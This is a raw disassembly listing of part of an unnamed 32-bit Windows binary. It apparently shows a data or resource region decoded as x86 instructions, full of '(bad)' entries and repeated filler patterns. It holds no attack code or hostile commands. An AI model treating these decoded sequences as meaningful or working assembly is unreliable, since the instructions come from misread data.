  405131:	add    BYTE PTR [eax],al
  405133:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405139:	add    BYTE PTR [eax],al
  40513b:	add    eax,DWORD PTR [eax-0x7fff0000]
  405141:	add    BYTE PTR [eax],al
  405143:	add    DWORD PTR [eax-0x7fff0000],eax
  405149:	add    BYTE PTR [eax],al
  40514b:	add    DWORD PTR [eax-0x1fff0000],eax
  405151:	add    BYTE PTR [eax],al
  405153:	add    esp,edi
  405155:	add    BYTE PTR [eax],al
  405157:	add    edi,edi
  405159:	add    BYTE PTR [eax],al
  40515b:	add    edi,edi
  40515d:	add    BYTE PTR [eax],0x3
  405160:	inc    DWORD PTR [eax-0x700000f9]
  405166:	(bad)  
  405167:	(bad)  
  405168:	(bad)  
  405169:	(bad)  
  40516a:	(bad)  
  40516b:	(bad)  
  40516c:	(bad)  
  40516d:	(bad)  
  40516e:	(bad)  
  40516f:	jmp    FWORD PTR [eax]
  405171:	add    BYTE PTR [eax],al
  405173:	add    BYTE PTR [eax],dl
  405175:	add    BYTE PTR [eax],al
  405177:	add    BYTE PTR [eax],ah
  405179:	add    BYTE PTR [eax],al
  40517b:	add    BYTE PTR [ecx],al
  40517d:	add    BYTE PTR [eax+eax*1],al
  405180:	add    BYTE PTR [eax],al
  405182:	add    BYTE PTR [eax],al
  405184:	add    BYTE PTR [eax],0x0
	...
  40519b:	add    BYTE PTR [eax],al
  40519d:	add    BYTE PTR [eax+0x800000],al
  4051a3:	add    BYTE PTR [eax],al
  4051a5:	add    BYTE PTR [eax+0x8000],0x0
  4051ac:	add    BYTE PTR [eax],0x80
  4051af:	add    BYTE PTR [eax-0x7fffff80],al
  4051b5:	add    BYTE PTR [eax-0x3f3f4000],0x0
  4051bc:	add    BYTE PTR [eax],al
  4051be:	inc    DWORD PTR [eax]
  4051c0:	add    bh,bh
  4051c2:	add    BYTE PTR [eax],al
  4051c4:	add    bh,bh
  4051c6:	inc    DWORD PTR [eax]
  4051c8:	inc    DWORD PTR [eax]
  4051ca:	add    BYTE PTR [eax],al
  4051cc:	inc    DWORD PTR [eax]
  4051ce:	inc    DWORD PTR [eax]
  4051d0:	(bad)  
  4051d1:	inc    DWORD PTR [eax]
  4051d3:	add    bh,bh
  4051d5:	(bad)  
  4051d6:	inc    DWORD PTR [eax]
	...
  4051e0:	ja     0x405252
  4051e2:	add    BYTE PTR [eax+0x808787],cl
  4051e8:	xchg   DWORD PTR [eax-0x78770800],eax
  4051ee:	add    BYTE PTR [eax],al
  4051f0:	mov    BYTE PTR [eax+0x70870000],al
  4051f6:	add    BYTE PTR [eax],al
  4051f8:	mov    BYTE PTR [eax-0x77777778],cl
  4051fe:	js     0x405278
  405200:	mov    BYTE PTR [eax-0x77777778],cl
  405206:	mov    BYTE PTR [eax-0x3b7b7778],cl
  40520c:	inc    edi
  40520d:	int3   
  40520e:	(bad)  
  40520f:	mov    BYTE PTR [eax-0x78837b78],cl
  405215:	(bad)  
  405216:	int3   
  405217:	mov    BYTE PTR [edx-0x307988],cl
  40521d:	mov    WORD PTR [esi-0x7a877e78],es
  405223:	push   0x88c8f7c7
  405228:	mov    BYTE PTR [edi-0x70333384],cl
  40522e:	into   
  40522f:	mov    BYTE PTR [eax],al
  405231:	or     BYTE PTR [esi+eax*8-0x77733032],al
  405238:	add    BYTE PTR [eax],cl
  40523a:	mov    esp,cs
  40523c:	enter  0xe777,0x88
  405240:	add    BYTE PTR [eax],cl
  405242:	xchg   DWORD PTR [eax-0x77777788],ecx
  405248:	add    BYTE PTR [eax],cl
  40524a:	mov    BYTE PTR [eax-0x70777778],cl
	...
  405258:	(bad)  
  405259:	inc    DWORD PTR [eax]
  40525b:	add    BYTE PTR [edi+eax*1],bl
  40525e:	add    BYTE PTR [eax],al
  405260:	sbb    al,0xf
  405262:	add    BYTE PTR [eax],al
  405264:	pop    ds
  405265:	pop    ds
	...
  405282:	add    BYTE PTR [eax],al
  405284:	loopne 0x405286
  405286:	add    BYTE PTR [eax],al
  405288:	loopne 0x40528a
  40528a:	add    BYTE PTR [eax],al
  40528c:	loopne 0x40528e
  40528e:	add    BYTE PTR [eax],al
  405290:	loopne 0x405292
  405292:	add    BYTE PTR [eax],al
  405294:	(bad)  
  405295:	inc    DWORD PTR [eax]
  405297:	add    BYTE PTR [eax],ch
  405299:	add    BYTE PTR [eax],al
  40529b:	add    BYTE PTR [eax],dh
  40529d:	add    BYTE PTR [eax],al
  40529f:	add    BYTE PTR [eax+0x0],ah
  4052a2:	add    BYTE PTR [eax],al
  4052a4:	add    DWORD PTR [eax],eax
  4052a6:	or     BYTE PTR [eax],al
  4052a8:	add    BYTE PTR [eax],al
  4052aa:	add    BYTE PTR [eax],al
  4052ac:	add    BYTE PTR [ecx],cl
	...
  4052b6:	add    BYTE PTR [eax],al
  4052b8:	add    BYTE PTR [ecx],al
  4052ba:	add    BYTE PTR [eax],al
  4052bc:	add    BYTE PTR [ecx],al
  4052be:	add    BYTE PTR [eax],al
  4052c0:	add    BYTE PTR [eax],al
  4052c2:	add    BYTE PTR [eax],al
  4052c4:	daa    
  4052c5:	add    BYTE PTR [edx],al
  4052c7:	add    BYTE PTR [eax+eax*1+0x0],bh
  4052cb:	add    BYTE PTR [edx+0x18],bh
  4052ce:	or     eax,0x1a237c00
  4052d3:	add    BYTE PTR [edi+0x30],bh
  4052d6:	daa    
  4052d7:	add    BYTE PTR [esi],al
  4052d9:	push   esp
  4052da:	sbb    eax,DWORD PTR [eax]
  4052dc:	dec    esi
  4052dd:	dec    esi
  4052de:	dec    esi
  4052df:	add    BYTE PTR [ebx+ecx*2+0x43],dl
  4052e3:	add    BYTE PTR [ebp+0x5e],bl
  4052e6:	pop    esi
  4052e7:	add    BYTE PTR [ebx+0x44],ah
  4052ea:	push   ebp
  4052eb:	add    BYTE PTR [ebx+0x63],ah
  4052ee:	arpl   WORD PTR [eax],ax
  4052f0:	push   0x66006564
  4052f5:	addr16 push 0x6a6a6a00
  4052fb:	add    BYTE PTR [ebp+ebp*2+0x6c],bh
  4052ff:	add    BYTE PTR [ecx+0x71],dh
  405302:	jno    0x405304
  405304:	jge    0x405378
  405306:	je     0x405308
  405308:	js     0x405382
  40530a:	ja     0x40530c
  40530c:	jnp    0x405389
  40530e:	jnp    0x405310
  405310:	mov    BYTE PTR [edi],al
  405312:	add    BYTE PTR [eax],al
  405314:	xchg   esi,eax
  405315:	or     al,BYTE PTR [eax]
  405317:	add    BYTE PTR [ecx-0x66fff6ed],cl
  40531d:	adc    al,BYTE PTR [eax+eax*1]
  405320:	lea    ebx,[edx*1+0x111a9000]
  405327:	add    BYTE PTR [eax+ecx*1+0xab60000],ah
  40532e:	add    BYTE PTR [eax],al
  405330:	test   al,0x15
  405332:	add    DWORD PTR [eax],eax
  405334:	mov    eax,0xb4000018
  405339:	sbb    DWORD PTR [ebx],edx
  40533b:	add    BYTE PTR [ebx-0x68ffe3dc],cl
  405341:	es sbb al,0x0
  405344:	lods   al,BYTE PTR ds:[esi]
  405345:	and    BYTE PTR [eax+eax*1],cl
  405348:	mov    ebp,0xaa000c22
  40534d:	daa    
  40534e:	pop    ss
  40534f:	add    BYTE PTR [ebx-0x47ffe8d6],dh
  405355:	xor    DWORD PTR ds:0x262b9700,ebx
  40535b:	add    BYTE PTR [ebp-0x69ffd6ce],al
  405361:	xor    eax,0x3c8b002d
  405366:	add    BYTE PTR ss:[eax-0x46ffccc7],bl
  40536d:	aaa    
  40536e:	add    BYTE PTR es:[esi-0x39ffcdc4],ah
  405375:	sbb    eax,DWORD PTR [eax]
  405377:	add    ah,dl
  405379:	sbb    eax,DWORD PTR [eax]
  40537b:	add    cl,dh
  40537d:	or     eax,DWORD PTR [eax]
  40537f:	add    cl,ch
  405381:	sbb    al,BYTE PTR [eax]
  405383:	add    dl,al
  405385:	and    ecx,DWORD PTR [ecx]
  405387:	add    bh,dl
  405389:	and    al,BYTE PTR [eax]
  40538b:	add    bh,al
  40538d:	cs adc al,0x0
  405390:	out    0x23,al
  405392:	add    BYTE PTR [eax],al
  405394:	repz and al,0x0
  405397:	add    dh,ah
  405399:	cmp    eax,0x37f5001d
  40539e:	adc    DWORD PTR [eax],eax
  4053a0:	les    edi,FWORD PTR ds:0x3bd1002a
  4053a6:	and    al,BYTE PTR [eax]
  4053a8:	fwait
  4053a9:	inc    edx
  4053aa:	add    BYTE PTR ss:[edx+eax*2+0x43bc003a],ah
  4053b2:	xor    eax,DWORD PTR [eax]
  4053b4:	mov    DWORD PTR [edx+0x2c],0x3448c900
  4053bb:	add    dh,dl
  4053bd:	dec    esi
  4053be:	aaa    
  4053bf:	add    dl,cl
  4053c1:	push   ecx
  4053c2:	ds add dh,dh
  4053c5:	push   esi
  4053c6:	xor    al,0x0
  4053c8:	xchg   esp,eax
  4053c9:	dec    esp
  4053ca:	inc    edi
  4053cb:	add    BYTE PTR [ecx-0x59ffadaa],bl
  4053d1:	dec    edx
  4053d2:	inc    esi
  4053d3:	add    BYTE PTR [ecx-0x4bffb7b0],ch
  4053d9:	push   ecx
  4053da:	inc    esp
  4053db:	add    BYTE PTR [ebp-0x4dffada7],ch
  4053e1:	pop    esp
  4053e2:	push   ebp
  4053e3:	add    BYTE PTR [ebp-0x57ffa69f],bl
  4053e9:	pusha  
  4053ea:	pop    ebp
  4053eb:	add    BYTE PTR [esi-0x76ffa69d],dh
  4053f1:	fs popa 
  4053f3:	add    BYTE PTR [edi-0x63ff9a9a],dl
  4053f9:	jno    0x405468
  4053fb:	add    BYTE PTR [esi-0x56ff8f8b],bl
  405401:	push   0x61
  405403:	add    BYTE PTR [edi-0x57ff9592],dh
  405409:	jb     0x405474
  40540b:	add    BYTE PTR [ecx-0x58ff948c],bh
  405411:	jg     0x40548d
  405413:	add    BYTE PTR [esi-0x37ff8d86],bh
  405419:	push   ebp
  40541a:	inc    esp
  40541b:	add    ah,dl
  40541d:	pop    ecx
  40541e:	inc    ebp
  40541f:	add    ah,ah
  405421:	pop    edi
  405422:	inc    edi
  405423:	add    dh,cl
  405425:	pusha  
  405426:	dec    esi
  405427:	add    ah,dl
  405429:	pusha  
  40542a:	dec    ebp
  40542b:	add    cl,cl
  40542d:	addr16 pop eax
  40542f:	add    dl,bl
  405431:	push   0x6ce50054
  405436:	push   esi
  405437:	add    bl,ah
  405439:	jb     0x405498
  40543b:	add    dh,dh
  40543d:	jb     0x405497
  40543f:	add    al,cl
  405441:	jbe    0x4054ad
  405443:	add    dh,bl
  405445:	js     0x4054ae
  405447:	add    dh,dl
  405449:	jg     0x4054bc
  40544b:	add    dh,ah
  40544d:	jnp    0x4054b7
  40544f:	add    BYTE PTR [esi],bh
  405451:	xchg   esp,eax
  405452:	add    BYTE PTR [si],dh
  405455:	int    0x7e
  405457:	add    BYTE PTR [eax],al
  405459:	jmp    FWORD PTR [ebx+0x0]
  40545c:	test   BYTE PTR [eax-0x7c52ff82],al
  405462:	jl     0x405464
  405464:	mov    BYTE PTR [edx+edi*2+0x6c81eb00],0x0
  40546c:	hlt    
  40546d:	sub    DWORD PTR [edx+0x0],0x7587ea
  405474:	cmc    
  405475:	lea    edi,[ecx+0x0]
  405478:	clc    
  405479:	xchg   ecx,eax
  40547a:	jl     0x40547c
  40547c:	jg     0x4054fd
  40547e:	add    DWORD PTR [eax],0x807f9c
  405484:	jg     0x405407
  405486:	add    DWORD PTR [eax],0x91a37a
  40548c:	je     0x405445
  40548e:	fwait
  40548f:	add    BYTE PTR [ecx-0x25],ah
  405492:	pushf  
  405493:	add    BYTE PTR [ebx+eax*4-0x7a7aff7c],al
  40549a:	mov    DWORD PTR [eax],eax
  40549c:	mov    BYTE PTR [edi-0x7474ff76],al
  4054a2:	mov    WORD PTR [eax],es
  4054a4:	popf   
  4054a5:	mov    DWORD PTR [edx-0x706e7000],ecx
  4054ab:	add    BYTE PTR [ebp+ecx*4-0x706dff6e],cl
  4054b2:	xchg   ebp,eax
  4054b3:	add    BYTE PTR [ebx-0x6cff686d],cl
  4054b9:	xchg   ebx,eax
  4054ba:	xchg   ebx,eax
  4054bb:	add    BYTE PTR [eax-0x6cff6869],bl
  4054c1:	xchg   edi,eax
  4054c2:	fwait
  4054c3:	add    BYTE PTR [eax-0x6aff646a],bl
  4054c9:	cdq    
  4054ca:	popf   
  4054cb:	add    BYTE PTR [ebx-0x56ff6466],bl
  4054d1:	mov    ecx,DWORD PTR [eax-0x7f784800]
  4054d7:	add    BYTE PTR [ebx-0x5bff746e],ah
  4054dd:	pushf  
  4054de:	fwait
  4054df:	add    BYTE PTR [ebp-0x6aff6b69],dh
  4054e5:	test   eax,0xa0a4009d
  4054ea:	lahf   
  4054eb:	add    BYTE PTR [eax-0x66ff625f],bh
  4054f1:	popf   
  4054f2:	mov    ds:0xa09ca900,al
  4054f7:	add    BYTE PTR [eax-0x6eff5359],bl
  4054fd:	mov    ebx,0xa3a300a7
  405502:	mov    ds:0xa5a5a800,eax
  405507:	add    BYTE PTR [ecx-0x5bff5857],ch
  40550d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40550e:	stos   BYTE PTR es:[edi],al
  40550f:	add    BYTE PTR [eax+ebp*4-0x5453ff54],ah
  405516:	lods   al,BYTE PTR ds:[esi]
  405517:	add    BYTE PTR [eax-0x46ff5c5c],dh
  40551d:	mov    ds:0xa9bc00a0,al
  405522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405523:	add    BYTE PTR [ebx-0x4eff5759],dh
  405529:	lods   al,BYTE PTR ds:[esi]
  40552a:	lods   al,BYTE PTR ds:[esi]
  40552b:	add    BYTE PTR [edx-0x4dff5454],bh
  405531:	mov    al,0xae
  405533:	add    BYTE PTR [edi+ebp*4-0x5254ff4d],ah
  40553a:	mov    al,0x0
  40553c:	mov    cl,0xaf
  40553e:	mov    al,0x0
  405540:	mov    esp,0xa300b4ae
  405545:	mov    al,0xb4
  405547:	add    BYTE PTR [eax-0x56ff484e],ch
  40554d:	mov    dh,0xbc
  40554f:	add    BYTE PTR [esi-0x4bff4446],ch
  405555:	mov    bl,0xb3
  405557:	add    BYTE PTR [ebx-0x43ff4c4d],bh
  40555d:	mov    eax,0xb6b000b5
  405562:	mov    edx,0xbab9b500
  405567:	add    BYTE PTR [ebx-0x3bff4446],bh
  40556d:	nop
  40556e:	mov    DWORD PTR [eax],eax
  405570:	(bad)  
  405571:	call   0x85:0x95ea0091
  405578:	neg    BYTE PTR [ecx-0x6012ff79]
  40557e:	nop
  40557f:	add    al,cl
  405581:	mov    ds:0xa8db009e,eax
  405586:	fwait
  405587:	add    al,ch
  405589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40558a:	mov    es,WORD PTR [eax]
  40558c:	cmc    
  40558d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40558e:	mov    es,WORD PTR [eax]
  405590:	jmp    0x98a8:0xf80094a5
  405597:	add    bl,ch
  405599:	mov    ch,0x9e
  40559b:	add    bl,bh
  40559d:	mov    bl,0x95
  40559f:	add    ah,al
  4055a1:	stos   BYTE PTR es:[edi],al
  4055a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a3:	add    bl,bl
  4055a5:	lods   al,BYTE PTR ds:[esi]
  4055a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a7:	add    dh,al
  4055a9:	mov    dl,0xac
  4055ab:	add    dh,dl
  4055ad:	mov    dh,0xac
  4055af:	add    ch,al
  4055b1:	test   eax,0xb0c600b6
  4055b6:	mov    al,0x0
  4055b8:	leave  
  4055b9:	mov    eax,0xbcc300b6
  4055be:	mov    esp,0xbcbdcc00
  4055c3:	add    cl,dl
  4055c5:	mov    ebp,0xbae800ba
  4055ca:	test   eax,0xa6b7fd00
  4055cf:	add    ch,bh
  4055d1:	mov    edi,0xc1b900b3
  4055d6:	mov    esi,0xb8c1da00
  4055db:	add    dh,bh
  4055dd:	ret    
  4055de:	stos   DWORD PTR es:[edi],eax
  4055df:	add    bh,ah
  4055e1:	lds    edi,FWORD PTR [eax-0x49370300]
  4055e7:	add    bh,bh
  4055e9:	sar    DWORD PTR [ebp-0x3d425200],1
  4055ef:	add    BYTE PTR [edi-0x3cff3d41],dh
  4055f5:	mov    ebp,0xc2ba00c1
  4055fa:	ret    
  4055fb:	add    BYTE PTR [ebx-0x44ff373d],dh
  405601:	(bad)  
  405602:	leave  
  405603:	add    BYTE PTR [edi-0x44ff3438],dh
  405609:	retf   0xcd
  40560c:	ret    
  40560d:	ret    
  40560e:	les    eax,FWORD PTR [eax]
  405610:	retf   
  405611:	(bad)  
  405612:	lds    eax,FWORD PTR [eax]
  405614:	iret   
  405615:	enter  0xc7,0xc4
  405619:	(bad)  
  40561a:	leave  
  40561b:	add    ah,cl
  40561d:	(bad)  
  40561e:	enter  0xc100,0xc9
  405622:	retf   
  405623:	add    bl,cl
  405625:	retf   
  405626:	retf   
  405627:	add    ch,dl
  405629:	retf   0xc7
  40562c:	(bad)  
  40562d:	ror    edi,1
  40562f:	add    ch,al
  405631:	into   
  405632:	rol    BYTE PTR [eax],cl
  405634:	iret   
  405635:	iret   
  405636:	rol    BYTE PTR [eax],1
  405638:	(bad)
  40563b:	add    ch,cl
  40563d:	rcl    ah,cl
  40563f:	add    dh,cl
  405641:	(bad)  
  405642:	fadd   DWORD PTR [eax]
  405644:	retf   0xdcda
  405647:	add    dl,dl
  405649:	rcl    ebx,cl
  40564b:	add    dl,bl
  40564d:	aam    0xd3
  40564f:	add    ah,dl
  405651:	xlat   BYTE PTR ds:[ebx]
  405652:	fadd   DWORD PTR [eax]
  405654:	aam    0xd9
  405656:	fild   DWORD PTR [eax]
  405658:	fcmovnu st,st(3)
  40565a:	fild   DWORD PTR [eax]
  40565c:	dec    dh
  40565e:	les    eax,FWORD PTR [eax]
  405660:	in     eax,dx
  405661:	xlat   BYTE PTR ds:[ebx]
  405662:	int    0x0
  405664:	(bad)  
  405665:	(bad)  
  405666:	mov    DWORD PTR [eax],0xd2dcfe
  40566c:	jmp    esp
  40566e:	fiadd  DWORD PTR [eax]
  405670:	into   
  405671:	fsubrp st(1),st
  405673:	add    bl,dl
  405675:	fsubrp st(1),st
  405677:	add    dl,bl
  405679:	(bad)  
  40567b:	add    cl,bl
  40567d:	loop   0x405662
  40567f:	add    dl,ah
  405681:	jecxz  0x405666
  405683:	add    cl,ch
  405685:	out    0xe6,eax
  405687:	add    cl,ah
  405689:	out    0xea,eax
  40568b:	add    bh,ah
  40568d:	jmp    0xec2b577b
  405692:	jmp    0x405694
  405694:	(bad)  
  405695:	jmp    0x40567c
  405697:	add    bh,bh
  405699:	lock jmp 0xee00:0xf0eee700
  4056a1:	repnz cmc 
  4056a3:	add    bl,dh
  4056a5:	hlt    
  4056a6:	hlt    
  4056a7:	add    bh,bh
  4056a9:	cmc    
  4056aa:	lock add dh,dh
  4056ad:	clc    
  4056ae:	stc    
  4056af:	add    dh,bh
  4056b1:	(bad)  
  4056b2:	inc    BYTE PTR [eax]
	...
  4056bc:	(bad)  
  4056bd:	(bad)  
  4056be:	inc    DWORD PTR [eax]
	...
  405768:	add    ch,bl
  40576a:	fstp   st(5)
  40576c:	fstp   st(5)
  40576e:	stos   BYTE PTR es:[edi],al
  40576f:	int    0x0
	...
  405795:	add    ch,bl
  405797:	fstp   st(5)
  405799:	lock icebp 
  40579b:	lock lock out 0xe6,al
  40579f:	out    0xdd,al
  4057a1:	rcl    DWORD PTR [ebp+0xd3],cl
	...
  4057c3:	add    BYTE PTR [edx-0x19192223],ch
  4057c9:	out    0xe6,al
  4057cb:	in     al,0xdd
  4057cd:	fstp   st(5)
  4057cf:	lock out 0xd3,al
  4057d2:	stos   BYTE PTR es:[edi],al
  4057d3:	fst    QWORD PTR [ebp+0x95]
	...
  4057f1:	add    bl,dl
  4057f3:	fstp   st(5)
  4057f5:	fstp   st(5)
  4057f7:	fucom  st(6)
  4057f9:	out    0xe6,al
  4057fb:	out    0xdd,al
  4057fd:	fstp   st(5)
  4057ff:	lock fstp QWORD PTR [ebx+edx*8-0x7c2c552a]
	...
  40581f:	add    BYTE PTR [eax],al
  405821:	fst    st(3)
  405823:	ror    ebp,cl
  405825:	(bad)  
  405826:	(bad)  
  405828:	fucom  st(6)
  40582a:	out    0xf0,al
  40582c:	fstp   st(1)
  40582e:	(bad)  
  405830:	int    0xd3
  405832:	fldenv [ebp+0x78d39595]
	...
  405850:	add    BYTE PTR [edi-0x29325556],ah
  405856:	(bad)  
  405858:	out    0xe6,al
  40585a:	out    0xe6,al
  40585c:	fstp   st(1)
  40585e:	aad    0xdd
  405860:	(bad)
  405863:	pushf  
  405864:	xchg   edx,eax
  405865:	adc    DWORD PTR [eax+0x8a],0x0
	...
  405880:	add    BYTE PTR [edx-0x403a5557],ch
  405886:	int    0xd9
  405888:	(bad)  
  40588a:	out    0xdd,al
  40588c:	fst    st(3)
  40588e:	(bad)  
  40588f:	int    0xc5
  405891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405892:	xchg   ebp,eax
  405893:	nop
  405894:	jle    0x405910
  405896:	nop
  405897:	nop
	...
  4058b0:	add    ch,bl
  4058b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b3:	stos   BYTE PTR es:[edi],al
  4058b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b5:	(bad)
  4058b8:	(bad)  
  4058ba:	(bad)  
  4058bc:	fxch   st(5)
  4058be:	int    0xa7
  4058c0:	pushf  
  4058c1:	nop
  4058c2:	jle    0x40593e
  4058c4:	jp     0x405945
  4058c6:	lahf   
  4058c7:	jle    0x4058c9
	...
  4058d1:	add    BYTE PTR [eax],al
  4058d3:	outs   dx,DWORD PTR ds:[esi]
  4058d4:	jp     0x405945
	...
  4058e2:	xchg   ebp,eax
  4058e3:	fst    st(3)
  4058e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e6:	test   eax,0xcdc5cdc5
  4058eb:	mov    edi,0x7f909ca9
  4058f0:	jne    0x405902
  4058f2:	or     eax,0x95907e71
  4058f7:	nop
  4058f8:	add    BYTE PTR [eax+0xd3],dl
  4058fe:	add    BYTE PTR [eax],al
  405900:	add    BYTE PTR [eax],al
  405902:	push   cs
  405903:	pushf  
  405904:	xor    eax,0xffffffe4
  405907:	or     al,0xe
  405909:	pop    es
  40590a:	or     al,0x90
  40590c:	outs   dx,DWORD PTR ds:[esi]
  40590d:	add    BYTE PTR [eax],al
  40590f:	add    BYTE PTR [eax],al
  405911:	add    BYTE PTR [eax],al
  405913:	nop
  405914:	xchg   ebp,eax
  405915:	(bad)  
  405916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405917:	pushf  
  405918:	nop
  405919:	nop
  40591a:	nop
  40591b:	jg     0x405994
  40591d:	adc    edx,DWORD PTR [eax]
  40591f:	or     eax,0x83750d09
  405924:	xchg   ebp,eax
  405925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405926:	stos   BYTE PTR es:[edi],al
  405927:	stos   BYTE PTR es:[edi],al
  405928:	out    0xe6,al
  40592a:	nop
  40592b:	add    BYTE PTR [eax],al
  40592d:	add    BYTE PTR [eax],al
  40592f:	add    BYTE PTR [eax],al
  405931:	(bad)  
  405932:	pushf  
  405933:	xchg   ecx,eax
  405934:	jle    0x4058cf
  405936:	fst    st(3)
  405938:	jle    0x4059b2
  40593a:	adc    BYTE PTR [edi-0x23],bh
  40593d:	int    0x13
  40593f:	add    BYTE PTR [eax],al
  405941:	add    BYTE PTR [eax],al
  405943:	add    BYTE PTR [eax],al
  405945:	jle    0x4059c6
  405947:	nop
  405948:	xchg   edx,eax
  405949:	nop
  40594a:	adc    edx,DWORD PTR [bp+si]
  40594d:	adc    esi,DWORD PTR [ecx+0x77]
  405950:	mov    dl,BYTE PTR [esp+ebx*4-0x315a5661]
  405957:	(bad)  
  405959:	mov    edi,0x90
  40595e:	add    BYTE PTR [eax],al
  405960:	add    bl,dl
  405962:	xchg   ecx,eax
  405963:	pushf  
  405964:	sbb    DWORD PTR [edi-0x566a6a23],0x78
  40596b:	push   cs
  40596c:	jno    0x4059ed
  40596e:	(bad)  [edx+0x71]
  405974:	add    BYTE PTR [eax],al
  405976:	add    BYTE PTR [eax],al
  405978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405979:	jg     0x4059f2
  40597b:	ja     0x4059f7
  40597d:	jp     0x4059fe
  40597f:	mov    dl,BYTE PTR [ebp+ebx*4-0x131e2e5c]
  405986:	in     al,0xda
  405988:	fst    st(3)
  40598a:	xchg   ebp,eax
  40598b:	add    BYTE PTR [eax],al
  40598d:	add    BYTE PTR [eax],al
  40598f:	add    BYTE PTR [eax],al
  405991:	xlat   BYTE PTR ds:[ebx]
  405992:	xchg   ebp,eax
  405993:	pushf  
  405994:	xchg   ecx,eax
  405995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405996:	int    0xa9
  405998:	stos   BYTE PTR es:[edi],al
  405999:	pushf  
  40599a:	(bad)  
  40599c:	xchg   edx,eax
  40599d:	adc    ch,BYTE PTR [edi+0x7a]
  4059a0:	stc    
  4059a1:	nop
  4059a2:	jne    0x4059a4
  4059a4:	add    BYTE PTR [eax],al
  4059a6:	lahf   
  4059a7:	mov    WORD PTR [esi+0x78],?
  4059aa:	js     0x405a26
  4059ac:	jge    0x405a2b
  4059ae:	mov    cs,ebx
  4059b0:	(bad)  
  4059b2:	(bad)  
  4059b3:	mov    ecx,0x1e2d3e62
  4059b8:	cwde   
  4059b9:	loope  0x40594b
  4059bb:	fld    QWORD PTR [eax]
  4059bd:	add    BYTE PTR [eax],al
  4059bf:	add    BYTE PTR [eax],al
  4059c1:	shl    DWORD PTR [eax-0x55586359],cl
  4059c7:	js     0x40594c
  4059c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059cb:	int    0xf4
  4059cd:	stc    
  4059ce:	jp     0x4059dc
  4059d0:	or     eax,0x90908377
  4059d5:	mov    WORD PTR [eax-0x5e717d81],es
  4059db:	lahf   
  4059dc:	pushf  
  4059dd:	mov    ebp,0x245b69b0
  4059e2:	sbb    ebx,DWORD PTR [edx]
  4059e4:	sbb    bl,BYTE PTR [edx+ebx*1]
  4059e7:	sbb    al,0x8b
  4059e9:	loope  0x405980
  4059eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ec:	add    BYTE PTR [eax],al
  4059ee:	add    BYTE PTR [eax],al
  4059f0:	add    dh,dl
  4059f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f3:	mov    edi,0x8ccdcd99
  4059f8:	jg     0x405a78
  4059fa:	jg     0x405a7a
  4059fc:	jle    0x405a7d
  4059fe:	jg     0x40598c
  405a00:	xchg   ebx,eax
  405a01:	xchg   esp,eax
  405a02:	popf   
  405a03:	mov    ds:0x99a4cba2,al
  405a08:	cwde   
  405a09:	stos   DWORD PTR es:[edi],eax
  405a0a:	push   ecx
  405a0b:	inc    esi
  405a0c:	and    DWORD PTR [edx],ebx
  405a0e:	sbb    bl,BYTE PTR [edx]
  405a10:	sbb    ah,BYTE PTR [ecx]
  405a12:	and    esp,DWORD PTR [ebx]
  405a14:	and    al,0x23
  405a16:	and    DWORD PTR [edx],esp
  405a18:	stos   DWORD PTR es:[edi],eax
  405a19:	in     al,dx
  405a1a:	pushf  
  405a1b:	xchg   ebp,eax
  405a1c:	add    BYTE PTR [eax],al
  405a1e:	add    BYTE PTR [eax],al
  405a20:	add    bl,dl
  405a22:	int    0xcd
  405a24:	xchg   ebp,eax
  405a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a26:	test   eax,0x7a838a83
  405a2b:	jle    0x405aa7
  405a2d:	jb     0x4059bb
  405a2f:	mov    eax,ds:0x98d3d2ce
  405a34:	test   DWORD PTR [ecx+0x44],edx
  405a37:	es adc eax,0x15141414
  405a3d:	pop    ss
  405a3e:	and    esp,DWORD PTR ds:0x25242523
  405a44:	and    eax,0x69222525
  405a49:	in     al,dx
  405a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a4b:	xchg   ebp,eax
  405a4c:	add    BYTE PTR [eax],al
  405a4e:	add    BYTE PTR [eax],al
  405a50:	add    dh,dl
  405a52:	aam    0xd4
  405a54:	pushf  
  405a55:	stos   BYTE PTR es:[edi],al
  405a56:	int    0x83
  405a58:	mov    bl,BYTE PTR [edi-0x34347d81]
  405a5e:	pushf  
  405a5f:	test   BYTE PTR [edx+0x44],cl
  405a62:	es push ss
  405a64:	add    al,BYTE PTR [edx]
  405a66:	add    al,BYTE PTR [edx]
  405a68:	adc    al,0x15
  405a6a:	sbb    bl,BYTE PTR [edx]
  405a6c:	pop    ss
  405a6d:	and    al,0x2b
  405a6f:	sub    ebp,DWORD PTR [ebx]
  405a71:	sub    edi,DWORD PTR [eax]
  405a73:	cmp    BYTE PTR [eax],bh
  405a75:	cmp    eax,0xec60333d
  405a7a:	stos   BYTE PTR es:[edi],al
  405a7b:	nop
  405a7c:	add    BYTE PTR [eax],al
  405a7e:	add    BYTE PTR [eax],al
  405a80:	add    bl,dl
  405a82:	(bad)  
  405a84:	pushf  
  405a85:	stos   BYTE PTR es:[edi],al
  405a86:	stos   BYTE PTR es:[edi],al
  405a87:	nop
  405a88:	nop
  405a89:	lahf   
  405a8a:	popf   
  405a8b:	jns    0x405ab6
  405a8d:	es push ss
  405a8f:	adc    al,0x2
  405a91:	add    al,BYTE PTR [edx]
  405a93:	add    al,BYTE PTR [edx]
  405a95:	push   ss
  405a96:	adc    eax,0x3041517
